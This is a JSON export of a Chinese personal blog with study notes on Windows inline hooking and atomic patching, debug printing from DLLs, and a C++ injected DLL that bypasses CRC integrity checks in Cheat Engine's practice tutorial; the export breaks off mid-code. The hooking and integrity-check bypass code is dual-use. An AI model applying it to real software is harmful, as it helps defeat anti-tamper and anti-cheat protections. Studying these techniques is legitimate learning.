{"meta":{"title":"LiuLian","subtitle":null,"description":"Salute The Time","author":"LiuLian","url":"http://liul14n.top","root":"/"},"pages":[{"title":"categories","date":"2019-05-13T02:31:50.000Z","updated":"2019-05-13T02:33:04.060Z","comments":true,"path":"categories/index.html","permalink":"http://liul14n.top/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HOOK技术学习笔记-其三","slug":"HOOK技术学习笔记-其三","date":"2022-06-27T00:51:07.000Z","updated":"2022-07-14T12:56:14.092Z","comments":true,"path":"2022/06/27/HOOK技术学习笔记-其三/","link":"","permalink":"http://liul14n.top/2022/06/27/HOOK技术学习笔记-其三/","excerpt":"","text":"0x00 前言之前写了CRC Check Bypass篇，以LUA脚本的方式过检测而本文则以C++ HOOK的方式来过掉CRC检测，本文后续的所有代码均是为了写成DLL之前那一篇用的CE自带的gtutorial-x86_64本文依然使用CE自带的gtutorial，不过是gtutorial-i3860x01 Go to do it !浅析具体思路和原理已经写在了CRC Check Bypass篇，这里便不再重复叙述。由于由64位(x86_64)换成了32位(i386)，地址也会有所变化，依然按照之前那篇的方式去寻找，找得三个扫描地址。对于004332C2处可以看到此处代码将[eax+ecx*2]的值赋值给eax，从而进行后续的操作。由此可以知道两条信息：[eax+ecx*2]即为需要校验的字节，即将被存放到eax中。eax+ecx*2(注意没有加[])即为存放该字节的地址。接下来要做的就是“移花接木”，具体细节在CRC Check Bypass篇也有写，概括就是，复制全部代码段到一段自己申请的内存，让这个CRC扫描程序去扫描复制过去的代码段，然后自己就可以随意修改真正的代码段了。但是问题的难点，也就是本文的重点也就来了：如何用C++去实现这些？难点一 内联汇编如何编写?可以在一个函数中采用__asm{}代码块的方式来编写汇编代码基本格式为12345static __declspec(naked) void foo() &#123; __asm &#123; //........ &#125;&#125;static关键字为了规避LNK2005的报错naked关键字告诉编译器，以下的汇编不需要编译器再优化什么指令难点二 相关参数如何传递?接下来就是边界比较了，那么该如何将上边界、下边界、基址、复制的代码段的基址等传递进来？我曾想过将函数写成static __declspec(naked) void foo(int param1, int param2)这种形式，但是这种形式的函数，在HOOK的时候，也是需要传参的，这样就极大的加大了HOOK框架的编写难度。翻阅了许多现有的代码，我发现大部分人都采用了硬编码的方式，例如要push程序基址，因为32位程序基址几乎都是0x400000，他们可以在确认目标程序的基址是0x400000以后硬编码进去，会有类似于如下的代码12345DWORD base = 0x400000......省略一大堆__asm&#123; push base&#125;基址还好，基本是个固定值，但是如果涉及到程序大小，而我还想动态获取它，那该如何操作？由于算是第一次接触内联汇编，也是不了解具体的优先顺序，我一直担心一个问题。如果我创建一个全局变量temp，然后利用一个函数动态地在HOOK之前就给这个全局变量temp赋上相应的值，那么我的内联汇编中类似于push temp的这个语句，到底是push了动态赋值前的temp还是动态赋值后的temp?经过实验，答案是后者！这也就意味着，我可以大胆的将全局变量应用到内联汇编中，尽管在编写代码的时候它们还未被真正的赋值！而且后续的测试证明，即便是封装成一个类，然后创建一个类对象，去传递这个对象的成员变量，也是可行的！但是也一定要记住，在HOOK之前，一定保证全局变量被动态赋值了！！优化点一 封装成类涉及到这么变量，不妨封装成一个类，然后在构造函数中，执行各种初始化(动态赋值)操作。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//CRC_Bypass.h#define JumpCall(frm, to) (int)( ((int)to - (int)frm) - 5)#define CRC_addr_1_offset 0x332C2#define CRC_addr_2_offset 0x33322#define CRC_addr_3_offset 0x33382#define CRC_addr_1_return_offset 0x332CC#define CRC_addr_2_return_offset 0x3332C#define CRC_addr_3_return_offset 0x3338Cclass CRC_Bypass&#123;public: CRC_Bypass() &#123;//构造函数 GetProcessImageBase(&amp;(this-&gt;pProcessImageBase), &amp;(this-&gt;dwProcessImageSize)); this-&gt;dwProcessImageBase = (DWORD)(this-&gt;pProcessImageBase); this-&gt;dwProcessImageEnd = (this-&gt;dwProcessImageBase) + (this-&gt;dwProcessImageSize); this-&gt;dwCRC_Bypass_return_1 = this-&gt;dwProcessImageBase + CRC_addr_1_return_offset; this-&gt;dwCRC_Bypass_return_2 = this-&gt;dwProcessImageBase + CRC_addr_2_return_offset; this-&gt;dwCRC_Bypass_return_3 = this-&gt;dwProcessImageBase + CRC_addr_3_return_offset; this-&gt;dwCRC_Bypass_Address_1 = this-&gt;dwProcessImageBase + CRC_addr_1_offset; this-&gt;dwCRC_Bypass_Address_2 = this-&gt;dwProcessImageBase + CRC_addr_2_offset; this-&gt;dwCRC_Bypass_Address_3 = this-&gt;dwProcessImageBase + CRC_addr_3_offset; CopyMemory2New(this-&gt;pProcessImageBase, this-&gt;dwProcessImageSize,&amp;(this-&gt;pAddrOfCopy)); this-&gt;dwAddrOfCopy = (DWORD)(this-&gt;pAddrOfCopy); &#125; PVOID pProcessImageBase;//程序基址 DWORD dwProcessImageBase;//程序基址 DWORD dwProcessImageSize;//程序代码段大小 DWORD dwProcessImageEnd;//程序代码段结束位置 PVOID pAddrOfCopy;//复制的代码段的基址 DWORD dwAddrOfCopy;//复制的代码段的基址 DWORD dwCRC_Bypass_return_1;//返回位置1 DWORD dwCRC_Bypass_return_2;//返回位置2 DWORD dwCRC_Bypass_return_3;//返回位置3 DWORD dwCRC_Bypass_Address_1;//Hook位置1 DWORD dwCRC_Bypass_Address_2;//Hook位置2 DWORD dwCRC_Bypass_Address_3;//Hook位置3 BYTE* CRC_Bypass_1_Original_Bytes;//保存被HOOK位置的原始字节码 BYTE* CRC_Bypass_2_Original_Bytes;//保存被HOOK位置的原始字节码 BYTE* CRC_Bypass_3_Original_Bytes;//保存被HOOK位置的原始字节码private: BOOL GetProcessImageBase(PVOID* pProcessImage, DWORD* dwProcessSize);//获取程序基址和代码段大小 BOOL CopyMemory2New(PVOID pProcessImage, DWORD dwProcessSize, PVOID* pAddrOfCopy);//执行复制内存的操作&#125;;难点三 内联汇编函数如何设计?对于0x4332C2处，编写得到如下代码：其中test是上述封装的类的一个对象实例。12345678910111213141516171819202122232425//为了避免“naked只能应用到非成员函数的定义”的报错，后续所有这类内联汇编函数均写在CRC_Bypass.cpp中CRC_Bypass test;static __declspec(naked) void CRC_Bypass_1() &#123; __asm &#123; push eax lea eax, [eax + ecx * 2] cmp eax, [test.pProcessImageBase] jb originalcode1 cmp eax, [test.dwProcessImageEnd] ja originalcode1 sub eax, [test.pProcessImageBase] add eax, [test.pAddrOfCopy] movzx eax, word ptr[eax] jmp exit1 originalcode1 : movzx eax, word ptr[eax + ecx * 2] exit1 : xor eax, [ebp - 0x10] mov[ebp - 0x10], eax pop eax push[test.dwCRC_Bypass_return_1] ret &#125;&#125;首先，由于会用到eax寄存器，故需要保存一下原有的值，可使用1push eax但是记得最后再进行一个pop eax在浅析中我们分析得知，[eax+ecx*2]即为需要校验的字节，即将被存放到eax中。eax+ecx*2(注意没有加[])即为存放该字节的地址。第2点可以作为突破口我们需要得到这个地址，显然可以使用lea指令，具体如下1lea eax, [eax + ecx * 2]从而使得eax中存放的是当前正在扫描的地址接下来比较这个地址是否超过上下界，如果越界均跳转到originalcode1标签处，然后执行程序原本的代码，不再进行“移花接木”。1234cmp eax, [test.pProcessImageBase]jb originalcode1cmp eax, [test.dwProcessImageEnd]ja originalcode1接下来借助如下三个关系当前语句在原始代码段中的偏移=当前地址(还在原始代码段中)-原始代码段的基址语句在原始代码段中的偏移=语句在新代码段(复制过去的)中的偏移当前语句在新代码段中的地址=新代码段的基址+偏移语句在原始代码段中的偏移可以得当前地址-原始代码段基址+新代码段基址=目标扫描地址(我们想让程序去扫的那个地址)12sub eax, [test.pProcessImageBase]add eax, [test.pAddrOfCopy]然后由于程序原本后续的各种操作都是利用eax寄存器而目前eax中是地址，地址里面存的是等待进行后续操作的值故需要将eax中的值再传递给eax寄存器1movzx eax, word ptr[eax]然后需要直接跳转到exit1标签处，以避免执行originalcode1标签处的原始代码。1jmp exit1至此，我们完成了“移花接木”操作。但是并没有完全结束，我们还需要收尾，由于我采用的是HOOK技术学习笔记-其二篇的HOOK小模板，固定至少需要修改8个字节明显能看出来，这8个字节会占用3条指令，第三条指令虽然占了但是没占满。所以可以得出来如下结论：我们需要在内联汇编函数中，补全被占掉的指令，其中第一条已经在前面补完了，包括两种处理情况，第一种是地址在上下界之间，则“移花接木”然后补；第二种是地址越界了，直接补(originalcode1)。补完以后要跳转回第四条指令，关于这个跳转，有很多办法，可以jmp，也可以push 地址/ret而且，还记得前面的push eax吗，在收尾的时候，也要进行一次pop eax综上所述，可以有123456exit1 : xor eax, [ebp - 0x10] mov[ebp - 0x10], eax pop eax push[test.dwCRC_Bypass_return_1] ret至此，内联汇编函数设计完毕，其他两处均可以仿照这个思路来进行设计！难点四 如何进行HOOK?我采用的是HOOK技术学习笔记-其二篇的HOOK小模板，能够保证HOOK的原子性12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//CRC_Bypass.cpp//======================================================================================void MakeMemoryWritable(unsigned long ulAddress, unsigned long ulSize, DWORD* OldProtect)&#123; MEMORY_BASIC_INFORMATION* mbi = new MEMORY_BASIC_INFORMATION; VirtualQuery((void*)ulAddress, mbi, ulSize); *OldProtect = mbi-&gt;Protect; if (mbi-&gt;Protect != PAGE_EXECUTE_READWRITE) &#123; unsigned long* ulProtect = new unsigned long; VirtualProtect((void*)ulAddress, ulSize, PAGE_EXECUTE_READWRITE, ulProtect); delete ulProtect; &#125; delete mbi;&#125;//======================================================================================void RestoreMemoryProtect(unsigned long ulAddress, unsigned long ulSize, DWORD OldProtect)&#123; if (OldProtect != PAGE_EXECUTE_READWRITE) &#123; unsigned long* temp = new unsigned long; VirtualProtect((void*)ulAddress, ulSize, OldProtect, temp); delete temp; &#125;&#125;//======================================================================================/*由于采用InterlockedExchange64方式，固定会占8字节从HOOK的起始位置往后数8字节，不足的进行对齐，ulNops即需要对齐多少字节这里并没有将多出来的碎片字节nop掉，而是直接返回到存在碎片字节的指令的下一条指令*/BOOL Hook(unsigned long ulAddress, void* Function, BYTE** pSavedArray, unsigned long ulNops)&#123; __try&#123; DWORD OldProtect = 0; MakeMemoryWritable(ulAddress, 8+ ulNops, &amp;OldProtect); *pSavedArray = (BYTE*)malloc(8+ ulNops); if (*pSavedArray == NULL) &#123; return FALSE; &#125; memcpy(*pSavedArray, (void*)ulAddress, 8+ ulNops); BYTE bReplace[8] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 &#125;; bReplace[0] = 0xE9; *(DWORD*)(&amp;(bReplace[1])) = JumpCall(ulAddress, Function); LONG64 llReplace; memcpy(&amp;llReplace, bReplace, 8); InterlockedExchange64((LONG64 volatile*)ulAddress, llReplace); RestoreMemoryProtect(ulAddress, 8+ ulNops, OldProtect); return TRUE; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; return FALSE; &#125;&#125;//======================================================================================BOOL CRC_Bypass_Start() &#123; Hook(test.dwCRC_Bypass_Address_1, CRC_Bypass_1, &amp;test.CRC_Bypass_1_Original_Bytes, 2); Hook(test.dwCRC_Bypass_Address_2, CRC_Bypass_2, &amp;test.CRC_Bypass_2_Original_Bytes, 2); Hook(test.dwCRC_Bypass_Address_3, CRC_Bypass_3, &amp;test.CRC_Bypass_3_Original_Bytes, 2); return TRUE;&#125;BOOL CRC_Bypass_End() &#123; memcpy((void*)(test.dwCRC_Bypass_Address_1), test.CRC_Bypass_1_Original_Bytes, _msize(test.CRC_Bypass_1_Original_Bytes)); memcpy((void*)(test.dwCRC_Bypass_Address_2), test.CRC_Bypass_2_Original_Bytes, _msize(test.CRC_Bypass_2_Original_Bytes)); memcpy((void*)(test.dwCRC_Bypass_Address_3), test.CRC_Bypass_3_Original_Bytes, _msize(test.CRC_Bypass_3_Original_Bytes)); return TRUE;&#125;123456//main.h#pragma once#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#include&lt;TlHelp32.h&gt;#include \"CRC_Bypass.h\"12345678910111213141516171819202122// dllmain.cpp : 定义 DLL 应用程序的入口点。#include \"pch.h\"#include \"main.h\"BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: CRC_Bypass_Start(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: //CRC_Bypass_End(); 由于本文只是为了测试CRC_Bypass的C++ DLL形式的可行性，故对此做了注释，若取消注释，DLL注入后执行完CRC_Bypass_Start()便紧跟着执行CRC_Bypass_End()，导致效果不可视。当然正式项目肯定会对这块做一个处理的。 break; &#125; return TRUE;&#125;0x02 参考内联汇编关于push的一个问题C++ Inline ASM内联汇编详解在__asm块中使用C或C++借鉴的一个代码","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"HOOK技术学习笔记-其二","slug":"HOOK技术学习笔记-其二","date":"2022-06-07T05:19:32.000Z","updated":"2022-07-13T20:24:23.186Z","comments":true,"path":"2022/06/07/HOOK技术学习笔记-其二/","link":"","permalink":"http://liul14n.top/2022/06/07/HOOK技术学习笔记-其二/","excerpt":"","text":"0x00 前言​ 来学习一下内联汇编的hook0x01 一个借鉴并改编来的HOOK小模板12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455//======================================================================================void MakeMemoryWritable(unsigned long ulAddress, unsigned long ulSize,DWORD *OldProtect)&#123; MEMORY_BASIC_INFORMATION* mbi = new MEMORY_BASIC_INFORMATION; VirtualQuery((void*)ulAddress, mbi, ulSize); *OldProtect = mbi-&gt;Protect; if (mbi-&gt;Protect != PAGE_EXECUTE_READWRITE) &#123; unsigned long * ulProtect = new unsigned long; VirtualProtect((void*)ulAddress, ulSize, PAGE_EXECUTE_READWRITE, ulProtect); delete ulProtect; &#125; delete mbi;&#125;//======================================================================================void RestoreMemoryProtect(unsigned long ulAddress, unsigned long ulSize, DWORD OldProtect)&#123; if (OldProtect != PAGE_EXECUTE_READWRITE) &#123; unsigned long* temp = new unsigned long; VirtualProtect((void*)ulAddress, ulSize, OldProtect, temp); delete temp; &#125;&#125;//======================================================================================/*由于采用InterlockedExchange64方式，固定会占8字节从HOOK的起始位置往后数8字节，不足的进行对齐，ulNops即需要对齐多少字节这里并没有将多出来的碎片字节nop掉，而是直接返回到存在碎片字节的指令的下一条指令*/BOOL Hook(unsigned long ulAddress, void* Function, BYTE** pSavedArray, unsigned long ulNops)&#123; __try&#123; DWORD OldProtect = 0; MakeMemoryWritable(ulAddress, 8+ ulNops, &amp;OldProtect); *pSavedArray = (BYTE*)malloc(8+ ulNops); if (*pSavedArray == NULL) &#123; return FALSE; &#125; memcpy(*pSavedArray, (void*)ulAddress, 8+ ulNops); BYTE bReplace[8] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 &#125;; bReplace[0] = 0xE9; *(DWORD*)(&amp;(bReplace[1])) = JumpCall(ulAddress, Function); LONG64 llReplace; memcpy(&amp;llReplace, bReplace, 8); InterlockedExchange64((LONG64 volatile*)ulAddress, llReplace); RestoreMemoryProtect(ulAddress, 8+ ulNops, OldProtect); return TRUE; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; return FALSE; &#125;&#125;//======================================================================================12345678//小示例void Start() &#123; Hook(hookAddr, targetFunc, &amp;pSavedArray,0);&#125;void End() &#123; memcpy((void*)hookAddr, pSavedArray, _msize(pSavedArray)); //_msize可以取到malloc时的长度，但是这对函数的使用提出了更严格的要求，由于单位是BYTE，所以没有必要去除以sizeof(BYTE)&#125;0x02 编写中遇到的几个问题LNK2005 某个变量已经在***.obj中定义这个问题的原因有多种而我是因为头文件的重复包含，具体来讲就是，某个头文件有被多个.h或者.cpp文件包含。因为在一个大的工程中，需要增加一个全局变量，一开始我是加在了某一个头文件中，然后报重复定义的错误，很显然，由于这个头文件被多个源文件include，虽然在编译阶段可能能通过，但是在链接的时候就会出现重复定义的错误。解决方法首先要做的尽量不把其他.cpp文件需要用到的变量定义在.h文件中！直接在其他.cpp文件中定义变量！方案一使用ifndef-define-endif的结构123456//InlineHook.h#include \"pch.h\"#ifndef INLINEHOOK_H_FILE#define INLINEHOOK_H_FILE//在这里面写内容#endif方案二使用#prama once结构123#pragma once#include \"pch.h\"//在这写内容C2065 未声明的标识符很尴尬的一个错误，是头文件顺序错了1234567//错误的顺序#include\"InlineHook.h\"#include\"pch.h\"//正确的顺序#include\"pch.h\"#include\"InlineHook.h\"naked只能应用到非成员函数的定义这种汇编的函数在头文件中的话，需要声明且实现，不可以在头文件(.h)声明而在源文件(.c或者.cpp)中实现而且为了避免再次出现LNK2005的报错，最好加上static关键字12345678910//示例, InlineHook.hstatic __declspec(naked) void test()&#123; __asm &#123; xor ecx, ecx mov dword ptr[ebp - 0x7c], ecx push 0x48C6E2 ret &#125;&#125;0x03 参考能不能在头文件中定义全局变量为什么不将全局变量的声明放在头文件中C++中为什么不能将全局变量定义在头文件中？ifndef与pragma once的对比","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"DLL输出调试信息的几种方式","slug":"DLL输出调试信息的几种方式","date":"2022-05-23T12:45:51.000Z","updated":"2022-05-23T13:04:49.581Z","comments":true,"path":"2022/05/23/DLL输出调试信息的几种方式/","link":"","permalink":"http://liul14n.top/2022/05/23/DLL输出调试信息的几种方式/","excerpt":"","text":"0x00 前言最近有一些调试DLL的需求平常经常写的控制台程序、Java、Python之类的都有相应的Print函数来输出一些调试信息但是DLL比较特殊，而我又习惯了这种通过Print来打印输出调试信息的方式(后期会逐渐过渡到Debug调试):cry:故搜集了几种相对应的方法0x01 PrintPrintPrint~以下三种方案均支持不定参数格式化关键头文件1#include &lt;stdarg.h&gt;解决报错对于以下的几种方案，如果编译环境是VS，均会产生报错，可以通过在头部#pragma warning(disable:4996)或者#define _CRT_SECURE_NO_WARNINGS方案一 MessageBox12345678910int CDECL MessageBoxPrintf(TCHAR * szCaption, TCHAR * szFormat, ...)&#123; TCHAR szBuff[MAX_PATH]; va_list args; va_start(args, szFormat); vsnprintf(szBuff, sizeof(szBuff) / sizeof(TCHAR), szFormat, args); //vsprintf(szBuff,szFormat,args); va_end(args); return MessageBox(NULL, szBuff, szCaption, 0);&#125;1MessageBoxPrintf((TCHAR*)(\"Title\"), (TCHAR*)(\"啊哈哈哈哈哈%d %s\"), int_num, str);方案二 文件读写12345678910111213141516171819202122232425void ShowDbgInfo(const char* data, ...)&#123; char temp[2048]; FILE * logFile = fopen(\"debug.log\", \"a+\"); if (!logFile) &#123; return; &#125; SYSTEMTIME st; GetLocalTime(&amp;st); sprintf(temp, \"[*] DLL_log: %d-%d-%d %02d:%02d:%02d \", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond); OutputDebugStringA(temp); fprintf(logFile, \"%s\", temp); va_list ap; va_start(ap, data); vsprintf(temp, data, ap); OutputDebugStringA(temp); va_end(ap); fprintf(logFile, \"%s\\n\", temp); fflush(logFile); fclose(logFile);&#125;1ShowDbgInfo(\" [+] %d %s\", int_num,str);方案三 控制台输出123456789101112131415161718192021int dllPrintf(char* fmt, ...)&#123; //不定参数格式化 va_list argptr; va_start(argptr, fmt); char buffer[512] = &#123; 0 &#125;; int cnt = vsprintf(buffer, fmt, argptr); va_end(argptr); //建立控制台窗口 static HANDLE gHConsole = INVALID_HANDLE_VALUE; if (INVALID_HANDLE_VALUE == gHConsole) &#123; AllocConsole(); gHConsole = GetStdHandle(STD_OUTPUT_HANDLE); &#125; //打印到指定的控制台窗口 DWORD dw; WriteConsole(gHConsole, buffer, strlen(buffer), &amp;dw, NULL); return(cnt);&#125;1dllPrintf(\" [+] %d %s\", int_num,str);0x02 参考DLL_MessageBoxDLL_文件读写DLL_控制台输出其中对于文件读写篇，本文修复了一个bug:原文fopen采用了w+参数，而实际上应该采用a+来进行追加写入，并完善了代码:新增fclose来关闭句柄。","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"HOOK技术学习笔记","slug":"HOOK技术学习笔记-其一","date":"2022-04-11T16:52:14.000Z","updated":"2022-06-07T05:25:01.582Z","comments":true,"path":"2022/04/12/HOOK技术学习笔记-其一/","link":"","permalink":"http://liul14n.top/2022/04/12/HOOK技术学习笔记-其一/","excerpt":"","text":"0x00 前言再来系统学习一下之前学的不扎实的HOOK技术:cry:HOOK技术，用好了能有很奇妙的效果哟~可以对程序的执行流进行监控、拦截。举个例子：键盘钩子，可以监控用户通过键盘输入了什么:happy:本文重点去讨论HOOK过程的原子性0x01 HOOK的几种分类HOOK技术可以分为Inline Hook、Address Hook、基于异常处理的Hook、不是HOOK的HOOK等1. Inline HookInline Hook是指直接修改指令的Hook，其关键是转移程序的执行流程，一般用jmp、call、retn等转移指令几种常见形式jmp xxxxxxxx(5字节)push xxxxxxxx / retn(6字节)mov eax,xxxxxxxx / jmp eax(7字节)call HookHotPatch Hook2. Address HookAddress Hook是指通过修改数据来进行Hook，这些数据往往是一些函数的地址或者偏移量，它们通常存放在某类数据结构中或是指定位置处，也可能是存在于寄存器中。它们有一个共同点，就是会在某时刻成为执行过程中的eip，因此将这数据替换成我们想要的函数地址就实现了Hook几种常见形式IAT(Import Address Table,输入表)EAT(Export Address Table,输出表)user32.dll的回调函数表IDT(Interrupt Descriptor Table,系统的中断描述符表)SSDT和Shadow SSDTC++类的虚函数表COM接口的功能函数表特殊寄存器中的地址特定的函数指针3. 基于异常处理的Hook在程序中自行安装SEH，向被HOOK的位置写入一条会引发异常的指令，只要程序执行到这里就会触发异常，从而跳转到事先安装的异常处理程序处。4. 不是HOOK的HOOK回顾病毒和操作系统的一些行为，都是在某些时候取得程序的控制权，并进行适当的处理。几种常见的形式PE被感染，修改EnterPoint会在执行完病毒代码后跳回正常的程序入口，使其不易被察觉。系统回调机制分层服务和过滤驱动模型0x02 几个细节1. 裸函数 naked__declspec(naked) 告诉编译器，以下的汇编不需要编译器再优化什么指令。2. 系统位数引起的细节问题指针指针在x86上4字节，在x64上8字节。可以使用ULONG_PTR来自适应于编译器，类似的还有SIZE_T内存地址对齐x64最好按照16字节来对齐，尽管x64对应8字节PE格式影响依照PE结构的HOOK调用约定x64仅有__fastcall调用方式用寄存器来传参第1~4个整型参数依次按照RCX、RDX、R8、R9来传参第1~4个浮点参数依次按照XMM0、XMM1、XMM2、XMM3来传参跳转指令对于直接跳转指令E9，跳转范围以当前位置为界，前后各2GB，在X86平台完全够用，但是在X64平台就不够了。所以在64位的情况下，jmp必须直接包含目标地址可以用mov rax,addr / jmp raxpush retjmp [addr]其中此jmp为FF25且Address = eip + 偏移量 + 6(指令长度)PatchGuard3. 一个经典的问题我们该如何保证HOOK的原子性？即，我们如何保证负责HOOK的线程在进行HOOK的时候，其他线程不会访问被HOOK但还没完成HOOK的代码段？这里提出几种解决方案，这几种解决方案均是受启发于《Windows核心编程》这本经典著作。方案一我们可以在执行HOOK的时候，挂起(Suspend)其他一切无关的线程，在HOOK完毕后再恢复(Resume)其他线程。不过，这个方案相比方案二，耗时会较多一些。相关代码如下：123456789101112131415161718192021222324252627282930BOOL Solution1(BOOL isSuspend) &#123; HANDLE hThread = NULL; DWORD dwPid = GetCurrentProcessId(); DWORD dwTid = GetCurrentThreadId(); THREADENTRY32 stThreadEntry32; stThreadEntry32.dwSize = sizeof(THREADENTRY32); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid); if (hSnapshot == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; BOOL anymore = Thread32First(hSnapshot, &amp;stThreadEntry32); while (anymore) &#123; if (stThreadEntry32.th32OwnerProcessID == dwPid &amp;&amp; stThreadEntry32.th32ThreadID != dwTid) &#123; hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, stThreadEntry32.th32ThreadID); if (!hThread) &#123; return FALSE; &#125; if (isSuspend) &#123; SuspendThread(hThread); &#125; else &#123; ResumeThread(hThread); &#125; CloseHandle(hThread); &#125; anymore = Thread32Next(hSnapshot, &amp;stThreadEntry32); &#125; CloseHandle(hSnapshot); return TRUE;&#125;方案二我们可以借助Windows提供的具有原子性的API，例如InterlockedExchange系列与InterlockedCompareExchange系列但是值得注意的是，这两个系列均仅支持修改1/2/4/8字节，并不支持修改其他字节，是的，我并没有找到直接修改HOOK所需的5或者7字节的API，但是这并不妨碍我们进行修改，例如我们的Inline Hook往往是需要修改5或者7字节，这都小于8字节，因此我们可以调用InterlockedExchange64来直接修改8字节！123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869BOOL Solution2_Install(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr) &#123; if (originalCodeAddr == 0 || originalSize &lt; 5 || originalSize &gt; 8 || newCodeAddr == 0) &#123; return FALSE; &#125; // 设置内存写权限 DWORD dwOldProtectFlag; BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag); if (!bRet) &#123; return FALSE; &#125; // 计算E9 JMP后面的4字节 = 要跳转的地址 - CALL的下一条指令的地址 DWORD dwJmpCode = newCodeAddr - (originalCodeAddr + 5); // 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节 BYTE bReplace[8] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;//全部用NOP替换 bReplace[0] = 0xE9; // JMP *(PDWORD)(&amp;(bReplace[1])) = dwJmpCode;//☆体会这种语句的好处 //这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓 memcpy( (BYTE*)(bReplace + originalSize), (LPVOID)(originalCodeAddr + originalSize), 8 - originalSize);//把后面字节copy过来 LONG64 llReplace; memcpy(&amp;llReplace, bReplace, 8);//全都copy给一个64位的变量 // 原子操作hook InterlockedExchange64((LONG64 volatile*)originalCodeAddr, llReplace); // 恢复内存属性 VirtualProtect((LPVOID)originalCodeAddr, 8, dwOldProtectFlag, &amp;dwOldProtectFlag); return TRUE;&#125;BOOL Solution2_Uninstall(DWORD originalCodeAddr, DWORD originalSize, BYTE * oldCodeAddr) &#123; if (originalCodeAddr == 0 || originalSize &lt; 5 || originalSize &gt; 8 || oldCodeAddr == 0) &#123; return FALSE; &#125; // 设置内存写权限 DWORD dwOldProtectFlag; BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag); if (!bRet) &#123; return FALSE; &#125; // 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节 BYTE bReplace[8] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;//全部用NOP替换 //这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓 memcpy((BYTE*)bReplace, (LPVOID)(oldCodeAddr), originalSize);//还原原始的 memcpy((BYTE*)(bReplace + originalSize), (LPVOID)(originalCodeAddr + originalSize), 8 - originalSize);//把后面字节copy过来 LONG64 llReplace; memcpy(&amp;llReplace, bReplace, 8);//全都copy给一个64位的变量 // 原子操作hook InterlockedExchange64((LONG64 volatile*)originalCodeAddr, llReplace); // 恢复内存属性 VirtualProtect((LPVOID)originalCodeAddr, 8, dwOldProtectFlag, &amp;dwOldProtectFlag); return TRUE;&#125;方案三借助信号量机制。首先，我们进行修改内存的时候极有可能使用memcpy这个函数，而这个函数并不是线程安全函数，引用自StackOverflowmemcpy is typically coded for raw speed. It will not be thread safe. If you require this, you need to perform the memcpy call inside of a critical section or use some other semaphor mechanism.1234&gt; take_mutex(&amp;mutex);&gt; memcpy(dst, src, count);&gt; yield_mutex(&amp;mutex);&gt;0x03 HOOK实例来写一个DLL来稍微练习一下HOOK同时为了应用上述提到的实现原子性的方案，给出多种代码作为参考。各方案共同的代码12345678910111213141516171819202122232425262728//InlineHook.h#pragma once#include &lt;windows.h&gt;#include &lt;Tlhelp32.h&gt;#include &lt;stdio.h&gt;//自定义函数int WINAPI HookMessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);//安装钩子BOOL InstallHook();//卸载钩子BOOL UnInstallHook();//初始化函数BOOL InitHook();//方案一,依据BOOL型参数来决定是挂起还是恢复BOOL Solution1(BOOL isSuspend);BOOL Solution2_Install(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr);BOOL Solution2_Uninstall(DWORD originalCodeAddr, DWORD originalSize, BYTE* oldCodeAddr);1234567891011121314151617181920212223// dllmain.cpp : 定义 DLL 应用程序的入口点。#include \"pch.h\"#include \"InlineHook.h\"BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: InitHook(); InstallHook(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: UnInstallHook(); break; &#125; return TRUE;&#125;方案一1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//InlineHook.cpp#include \"InlineHook.h\"DWORD g_unHook = NULL;//保存函数地址BYTE g_oldCode[5] = &#123; 0 &#125;;//原始的5个字节BYTE g_newCode[5] = &#123; 0xE9 &#125;;//改变后的5个字节//自定义函数int WINAPI HookMessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) &#123; UnInstallHook();//先卸载钩子，防止死循环 int result = MessageBox(NULL, TEXT(\"HOOK Success\"), TEXT(\"test4fun\"), MB_OK); InstallHook(); return result;&#125;BOOL InitHook() &#123; HMODULE hMoudle = LoadLibrary(\"user32.dll\"); if (!hMoudle) &#123; return 